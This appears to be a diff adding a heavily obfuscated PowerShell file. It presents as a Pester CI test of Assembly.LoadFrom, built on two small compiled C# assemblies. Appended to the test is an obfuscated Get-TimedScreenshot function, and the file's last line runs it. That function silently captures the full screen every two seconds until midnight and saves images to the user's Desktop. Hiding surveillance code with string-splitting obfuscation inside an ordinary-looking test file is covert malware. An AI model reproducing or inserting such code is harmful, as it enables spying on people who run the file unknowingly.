@@ -1,0 +1,131 @@
+  .('SV')  ("p"+"hK") ( [tYPE]("{1}{2}{3}{0}"-F 'Th','SYST','em','.Io.Pa')) ; ${7`Yf5j}=  [tYPE]("{5}{4}{0}{2}{1}{3}{7}{6}"-f'E','FLectIO','m.RE','N.ASsE','T','Sys','YnAME','MBL'); &("{0}{1}{2}"-f 'SET','-i','TEM')  ("{1}{2}{0}"-f 'Yq','vARiABLe:','n') (  [TYpE]("{5}{1}{4}{2}{3}{0}" -F'y','TEm.ReF','eCTION.AsSEM','bl','l','SYS')) ;    .("{1}{0}{2}" -f '-IT','Set','em') ('v'+'ar'+'iAbLe:WR2'+'MD'+'4') ([TypE]("{2}{3}{5}{1}{4}{0}" -f'r','.coNsuM','AS','SemBLy','E','.FOo')  ) ; .("{2}{0}{1}"-f 'I','TEm','sET-')  ("{2}{0}{1}"-f'Ble',':g7Ob','vARIA')  ([TypE]("{0}{4}{5}{2}{1}{3}" -F'A','baR.prOv','lY.','iDEr','sSe','mB') );&('sv') ("{1}{0}" -f 'a','F3vd')  ( [tYpe]("{3}{6}{5}{2}{0}{1}{4}" -f'mIN','FOR','RMS.sYstE','WinD','MAtiOn','Fo','OWS.') )  ; ${o`cBk`G6}= [tYpe]("{1}{2}{0}{3}"-f'.','dr','AwInG','GrapHiCs')  ;  ${3m4r`9F} = [TyPe]("{0}{1}{3}{2}" -F'D','RAW','nT','iNg.poi'); 
+
+
+&("{2}{0}{1}" -f 'sc','ribe','De') ("{5}{1}{4}{3}{2}{8}{6}{7}{0}"-f 'Test','ly.LoadFro','ali',' V','m','Assemb','t','ion ','da') -Tags "CI" {
+    &("{1}{0}{2}" -f 'foreAl','Be','l') {
+        ${CO`NSU`ME`RCodE} = @'
+            using System;
+            using Assembly.Bar;
+
+            namespace Assembly.Foo
+            {
+                public class Consumer
+                {
+                    public static string GetName()
+                    {
+                        return Provider.GetProviderName();
+                    }
+                }
+            }
+'@
+        ${pr`ovi`dE`RcodE} = @'
+            using System;
+
+            namespace Assembly.Bar
+            {
+                public class Provider
+                {
+                    public static string GetProviderName()
+                    {
+                        return "Assembly.Bar.Provider";
+                    }
+                }
+            }
+'@
+
+        
+        
+        ${tEM`P`pAth} =   ${p`HK}::("{3}{2}{0}{1}"-f'T','empFileName','et','G').Invoke()
+        if (.("{0}{2}{1}"-f 'Tes','Path','t-') ${TeM`P`PaTH}) { .("{0}{1}{2}"-f'Remo','ve','-Item') -Path ${teMP`P`A`TH} -Force -Recurse }
+        &("{2}{0}{1}"-f'w-I','tem','Ne') -Path ${temPP`AtH} -ItemType ("{0}{2}{1}" -f 'Dire','ry','cto') -Force > ${nU`Ll}
+
+        ${Co`NSume`RaSS`e`mB`lY} = .("{0}{1}{2}" -f'J','oi','n-Path') -Path ${T`e`MPp`AtH} -ChildPath ("{0}{1}{2}{3}"-f 'Consum','er.','dl','l')
+        ${pr`oVI`DERaSs`eMBly} = &("{0}{2}{1}" -f'J','-Path','oin') -Path ${t`EMpPa`TH} -ChildPath ("{3}{0}{1}{2}"-f 'de','r','.dll','Provi')
+
+        .("{1}{0}"-f'ype','Add-T') -TypeDefinition ${p`RoVID`ER`COdE} -OutputType ("{0}{1}"-f'L','ibrary') -OutputAssembly ${PROVI`DEr`A`SseMbly}
+        .("{2}{0}{1}"-f 'y','pe','Add-T') -TypeDefinition ${C`O`NSu`ME`RcoDe} -OutputType ("{0}{1}"-f 'Librar','y') -OutputAssembly ${cOn`s`UMErA`ssEM`B`Ly} -ReferencedAssemblies ${pR`oViD`eR`Assem`BLy}
+
+        
+        
+        ${AS`s`e`m`BLyName} =   (  &("{0}{1}" -f'G','cI') ("{0}{2}{1}{3}"-f 'v',':7yF5','ArIablE','j')  ).vaLue::("{3}{1}{0}{2}" -f 'lyNa','etAssemb','me','G').Invoke(${pROvIdeR`A`SsE`MBLY})
+        ${Pr`OVi`d`erA`sSeM`B`lYneWpAtH} = .("{0}{3}{2}{1}"-f'Join','th','Pa','-') -Path ${tE`mppA`TH} -ChildPath "$($AssemblyName.Name).dll"
+        .("{1}{2}{0}" -f'm','Mo','ve-Ite') -Path ${Pr`ovI`dERaS`SeMb`lY} -Destination ${pr`OvIdERass`eMbl`Y`NeWpa`TH}
+    }
+
+    &('It') ("{1}{2}{12}{15}{7}{6}{18}{17}{0}{11}{10}{14}{21}{8}{5}{3}{20}{19}{9}{13}{4}{16}"-f'ical','Asse','mb','eferenced',' the same fo','r','ld ','ou','t ','ly','lo','ly ','ly.Load',' from','ad the imp','From sh','lder','omat','aut','b',' assem','lici') {
+        
+        { [Assembly.Foo.Consumer] } | &("{1}{0}" -f'ld','Shou') -Throw -ErrorId ("{3}{0}{2}{1}"-f 'eNotF','und','o','Typ')
+        { [Assembly.Bar.Provider] } | .("{1}{0}"-f 'ould','Sh') -Throw -ErrorId ("{2}{0}{1}{3}" -f'tFo','un','TypeNo','d')
+
+        
+          ( .("{0}{1}" -f'G','ET-itEm') ("{0}{2}{1}{3}"-f 'vARIa',':N','bLE','yq')).vALUE::("{2}{0}{1}"-f'ad','From','Lo').Invoke(${coN`SU`mErAss`eMBly}) > ${n`ULL}
+         ${W`R2`mD4}."fUL`lName" | &("{0}{2}{1}" -f'Sh','uld','o') -Be ("{2}{4}{1}{0}{3}"-f 'ume','Cons','Assembly.Foo','r','.')
+        
+        { [Assembly.Bar.Provider] } | .("{1}{0}{2}"-f'h','S','ould') -Throw -ErrorId ("{3}{1}{0}{2}" -f'otFou','peN','nd','Ty')
+
+        
+         (  .("{3}{2}{1}{0}"-f'RiaBLE','A','-v','get')  ('W'+'r'+'2md4') -valu  )::("{0}{1}{2}" -f'G','e','tName').Invoke() | &("{2}{0}{1}" -f 'hou','ld','S') -BeExactly ("{6}{0}{2}{5}{3}{1}{4}"-f 'ssembly','d','.Bar','i','er','.Prov','A')
+        
+          ${g7`OB}."FU`LlnA`ME" | .("{1}{2}{0}"-f 'd','Sho','ul') -BeExactly ("{4}{1}{2}{0}{3}" -f 'd','y.Bar.P','rovi','er','Assembl')
+    }
+}
+
+function g`ET-ti`M`eD`Sc`REenshOT
+{
+    [CmdletBinding()] Param(
+        [Parameter(MAndAToRy=${t`RUE})]             
+        [ValidateScript({.("{0}{1}{2}" -f'Tes','t-','Path') -Path ${_} })]
+        [String] ${pa`Th}, 
+
+        [Parameter(mAnDATory=${T`RUE})]             
+        [Int32] ${I`NTe`R`Val},
+
+        [Parameter(mANDaTOrY=${T`RUe})]             
+        [String] ${En`DTI`Me}    
+    )
+
+    Function G`E`T-scrEeNSh`OT {
+       ${S`CRee`NBOUNDS} =   (&("{0}{2}{1}{3}" -f'gE','-cHIlDIT','T','em') ("{1}{2}{0}"-f 'f3vdA','VARiablE',':')  ).vAlUe::"VIR`T`UaLsc`REEN"
+       ${S`C`REEnsHo`TObJE`Ct} = &("{0}{2}{1}"-f'N','w-Object','e') ("{1}{0}{3}{4}{2}" -f 'i','Draw','map','n','g.Bit') ${ScrE`EN`BOuNds}."WI`DTH", ${S`c`REEnB`OunDS}."Hei`GhT"
+       ${D`R`AwINGGrA`phIcs} =  ( .("{0}{1}"-f'c','hilDIteM') ("{3}{4}{2}{0}{1}" -f'k','G6','b','vARIablE:','OC')  ).VaLuE::("{0}{1}{2}" -f 'FromIm','a','ge').Invoke(${s`creE`NshOt`objEct})
+       ${d`RA`WINggraPhicS}."CopYFro`m`S`CRE`eN"( ${Sc`Re`e`NBoun`DS}."LoCAt`IOn",   ${3m`4r9F}::"E`MpTy", ${sC`R`E`eNBoU`Nds}."s`izE")
+       ${d`R`A`w`InGGRApHiCS}.("{1}{2}{0}" -f 'pose','Di','s').Invoke()
+       ${ScreeNS`hO`To`B`jECT}.("{0}{1}" -f 'Sa','ve').Invoke(${FI`l`EPa`Th})
+       ${ScRE`ENSHo`TOBj`ECT}.("{1}{0}" -f'pose','Dis').Invoke()
+    }
+
+    Try {
+            
+        
+        .("{0}{2}{1}" -f'Add','Type','-') -Assembly ("{5}{3}{0}{6}{2}{4}{1}" -f'te','s.Forms','in','s','dow','Sy','m.W')            
+
+        Do {
+            
+            ${T`iME} = (.("{2}{0}{1}" -f'et-Da','te','G'))
+            
+            [String] ${FilE`N`Ame} = "$($Time.Month)"
+            ${Fil`E`NAmE} += '-'
+            ${FIL`ENa`Me} += "$($Time.Day)" 
+            ${fI`LEnA`Me} += '-'
+            ${fiLE`N`AMe} += "$($Time.Year)"
+            ${FIL`En`AME} += '-'
+            ${f`Il`eNAmE} += "$($Time.Hour)"
+            ${f`ILeNa`me} += '-'
+            ${fI`l`ena`mE} += "$($Time.Minute)"
+            ${F`Il`EName} += '-'
+            ${fIlENA`mE} += "$($Time.Second)"
+            ${fI`l`eName} += ("{1}{0}" -f 'g','.pn')
+
+            [String] ${fi`lE`paTH} = (.("{1}{0}{2}" -f 'at','Join-P','h') ${Pa`Th} ${fI`l`eN`AmE})
+            .("{2}{0}{4}{1}{3}"-f'et-Scre','nsho','G','t','e')
+
+            .("{0}{1}{2}" -f 'Sta','rt-Sl','eep') -Seconds ${INTE`Rv`AL}
+        }
+
+        While ((&("{0}{2}{1}"-f 'G','t-Date','e') -Format ("{1}{0}" -f 'H:mm','H')) -lt ${en`DTiMe})
+    }
+
+    Catch {.("{1}{0}{3}{2}" -f't','Wri','Error','e-') ${er`ROr}[0].("{0}{2}{1}"-f 'T','ing','oStr').Invoke() ('+') ${ERR`OR}[0]."iNvoCat`IOnI`NfO"."pOSI`TI`OnmeS`SAGE"}
+}
+
+.("{1}{2}{6}{4}{5}{3}{0}" -f'enshot','Ge','t-T','e','medSc','r','i') -Path "$env:userprofile\Desktop" -Interval 2 -EndTime ("{1}{0}"-f'0','24:0')
